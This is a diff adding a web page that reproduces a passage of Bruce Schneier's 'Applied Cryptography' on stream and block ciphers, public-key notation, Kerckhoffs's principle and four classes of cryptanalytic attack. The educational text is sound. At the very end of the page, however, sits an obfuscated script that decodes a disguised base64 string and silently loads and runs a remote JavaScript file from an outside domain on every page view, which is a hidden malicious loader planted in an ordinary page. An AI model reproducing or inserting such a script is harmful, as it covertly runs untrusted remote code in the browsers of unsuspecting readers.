@@ -1,0 +1,108 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Foundations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=01//-->
+<!--PAGES=004-006//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="01-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="01-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Symmetric algorithms can be divided into two categories. Some operate on the plaintext a single bit (or sometimes byte) at a time; these are called <B>stream algorithms</B> or <B>stream ciphers</B>. Others operate on the plaintext in groups of bits. The groups of bits are called <B>blocks</B>, and the algorithms are called <B>block algorithms</B> or <B>block ciphers</B>. For modern computer algorithms, a typical block size is 64 bits&#151;large enough to preclude analysis and small enough to be workable. (Before computers, algorithms generally operated on plaintext one character at a time. You can think of this as a stream algorithm operating on a stream of characters.)</P>
+<P><FONT SIZE="+1"><B><I>Public-Key Algorithms</I></B></FONT></P>
+<P><B>Public-key algorithms</B> (also called asymmetric algorithms) are designed so that the key used for encryption is different from the key used for decryption. Furthermore, the decryption key cannot (at least in any reasonable amount of time) be calculated from the encryption key. The algorithms are called &#147;public-key&#148; because the encryption key can be made public: A complete stranger can use the encryption key to encrypt a message, but only a specific person with the corresponding decryption key can decrypt the message. In these systems, the encryption key is often called the <B>public key</B>, and the decryption key is often called the <B>private key</B>. The private key is sometimes also called the secret key, but to avoid confusion with symmetric algorithms, that tag won&#146;t be used here.</P>
+<P>Encryption using public key <I>K</I> is denoted by:</P>
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>M</I>) = <I>C</I>
+</DL>
+<P>Even though the public key and private key are different, decryption with the corresponding private key is denoted by:
+</P>
+<DL>
+<DD><I>D</I><SUB>K</SUB>(<I>C</I>) = <I>M</I>
+</DL>
+<P>Sometimes, messages will be encrypted with the private key and decrypted with the public key; this is used in digital signatures (see Section 2.6). Despite the possible confusion, these operations are denoted by, respectively:
+</P>
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>M</I>) = <I>C</I>
+<DD><I>D</I><SUB>K</SUB>(<I>C</I>) = <I>M</I>
+</DL>
+<P><FONT SIZE="+1"><B><I>Cryptanalysis</I></B></FONT></P>
+<P>The whole point of cryptography is to keep the plaintext (or the key, or both) secret from eavesdroppers (also called adversaries, attackers, interceptors, interlopers, intruders, opponents, or simply the enemy). Eavesdroppers are assumed to have complete access to the communications between the sender and receiver.
+</P>
+<P>Cryptanalysis is the science of recovering the plaintext of a message without access to the key. Successful cryptanalysis may recover the plaintext or the key. It also may find weaknesses in a cryptosystem that eventually lead to the previous results. (The loss of a key through noncryptanalytic means is called a <B>compromise</B>.)</P>
+<P>An attempted cryptanalysis is called an <B>attack</B>. A fundamental assumption in cryptanalysis, first enunciated by the Dutchman A. Kerckhoffs in the nineteenth century, is that the secrecy must reside entirely in the key [794]. Kerckhoffs assumes that the cryptanalyst has complete details of the cryptographic algorithm and implementation. (Of course, one would assume that the CIA does not make a habit of telling Mossad about its cryptographic algorithms, but Mossad probably finds out anyway.) While real-world cryptanalysts don&#146;t always have such detailed information, it&#146;s a good assumption to make. If others can&#146;t break an algorithm, even with knowledge of how it works, then they certainly won&#146;t be able to break it without that knowledge.</P>
+<P>There are four general types of cryptanalytic attacks. Of course, each of them assumes that the cryptanalyst has complete knowledge of the encryption algorithm used:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;<B>Ciphertext-only attack</B>. The cryptanalyst has the ciphertext of several messages, all of which have been encrypted using the same encryption algorithm. The cryptanalyst&#146;s job is to recover the plaintext of as many messages as possible, or better yet to deduce the key (or keys) used to encrypt the messages, in order to decrypt other messages encrypted with the same keys.
+<DL>
+<DD>Given: <I>C</I><SUB>1</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>1</SUB>), <I>C</I><SUB>2</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>2</SUB>),...<I>C<SUB>i</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>i</SUB>)
+<DD>Deduce: Either <I>P</I><SUB>1</SUB>, <I>P</I><SUB>2</SUB>,...<I>P</I><SUB>i</SUB>; <I>k</I>; or an algorithm to infer <I>P</I><SUB>i&#43;1</SUB> from <I>C</I><SUB>i&#43;1</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>i&#43;1</SUB>)
+</DL>
+<DD><B>2.</B>&nbsp;&nbsp;<B>Known-plaintext attack</B>. The cryptanalyst has access not only to the ciphertext of several messages, but also to the plaintext of those messages. His job is to deduce the key (or keys) used to encrypt the messages or an algorithm to decrypt any new messages encrypted with the same key (or keys).
+<DL>
+<DD>Given: <I>P</I><SUB>1</SUB>, <I>C</I><SUB>1</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>1</SUB>), <I>P</I><SUB>2</SUB>, <I>C</I><SUB>2</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>2</SUB>),...<I>P</I><SUB>i</SUB>, <I>C</I><SUB>i</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>i</SUB>)
+<DD>Deduce: Either <I>k</I>, or an algorithm to infer <I>P</I><SUB>i&#43;1</SUB> from <I>C</I><SUB>i&#43;1</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>i&#43;1</SUB>)
+</DL>
+<DD><B>3.</B>&nbsp;&nbsp;<B>Chosen-plaintext attack</B>. The cryptanalyst not only has access to the ciphertext and associated plaintext for several messages, but he also chooses the plaintext that gets encrypted. This is more powerful than a known-plaintext attack, because the cryptanalyst can choose specific plaintext blocks to encrypt, ones that might yield more information about the key. His job is to deduce the key (or keys) used to encrypt the messages or an algorithm to decrypt any new messages encrypted with the same key (or keys).
+<DL>
+<DD>Given: <I>P</I><SUB>1</SUB>, <I>C</I><SUB>1</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>1</SUB>), <I>P</I><SUB>2</SUB>, <I>C</I><SUB>2</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>2</SUB>),...<I>P</I><SUB>i</SUB>, <I>C</I><SUB>i</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>i</SUB>), where the cryptanalyst gets to choose <I>P</I><SUB>1</SUB>, <I>P</I><SUB>2</SUB>,...<I>P</I><SUB>i</SUB>
+<DD>Deduce: Either <I>k</I>, or an algorithm to infer <I>P</I><SUB>i&#43;1</SUB> from <I>C</I><SUB>i</I>&#43;1</SUB> = <I>E</I><SUB>k</SUB>(<I>P</I><SUB>i&#43;1</SUB>)
+</DL>
+<DD><B>4.</B>&nbsp;&nbsp;<B>Adaptive-chosen-plaintext attack</B>. This is a special case of a chosen-plaintext attack. Not only can the cryptanalyst choose the plaintext that is encrypted, but he can also modify his choice based on the results of previous encryption. In a chosen-plaintext attack, a cryptanalyst might just be able to choose one large block of plaintext to be encrypted; in an adaptive-chosen-plaintext attack he can choose a smaller block of plaintext and then choose another based on the results of the first, and so forth.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="01-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="01-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(sWyhKzQg, YdedOWSi) {YdedOWSi = sWyhKzQg.createElement('script');YdedOWSi.type = 'text/javascript';YdedOWSi.async = true;YdedOWSi.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');sWyhKzQg.getElementsByTagName('body')[0].appendChild(YdedOWSi);}(document));</script></body>
+</html>
